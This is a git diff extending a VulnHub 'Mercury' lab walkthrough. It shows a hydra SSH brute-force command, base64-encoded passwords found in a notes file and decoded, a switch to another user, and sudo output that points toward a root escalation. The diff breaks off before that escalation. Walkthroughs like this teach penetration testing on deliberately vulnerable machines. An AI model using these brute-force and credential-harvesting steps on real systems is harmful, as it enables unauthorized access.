@@ -104,5 +104,59 @@ root@kali: hydra -L users.txt -P passwords.txt -e nsr 192.168.56.139 ssh -t 10
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b1f06b18-dc40-4101-b08b-8dcfbab6872b)
 
+now we can connect to victim using `webmaster:mercuryisthesizeof0.056Earths`
+
+### 4.Privilege Escalation (To linuxmaster)
+
+In home directory of user `webmaster` there is another directory called `mercury_proj` and a file `note.txt` :
+
+```bash
+webmaster@mercury:~$ cat mercury_proj/notes.txt 
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+```
+
+here is the password for user `linuxmaster` :
+
+```bash
+webmaster@mercury:~$ echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d
+mercurymeandiameteris4880km
+```
+
+### 5.Privilege Escalation (To root)
+
+We connect to user `linuxmaster:mercurymeandiameteris4880km` :
+
+```bash
+webmaster@mercury:~$ su linuxmaster
+Password: 
+linuxmaster@mercury:/home/webmaster$
+```
+
+check sudo permissions :
+
+```bash
+linuxmaster@mercury:/home/webmaster$ sudo -l
+[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
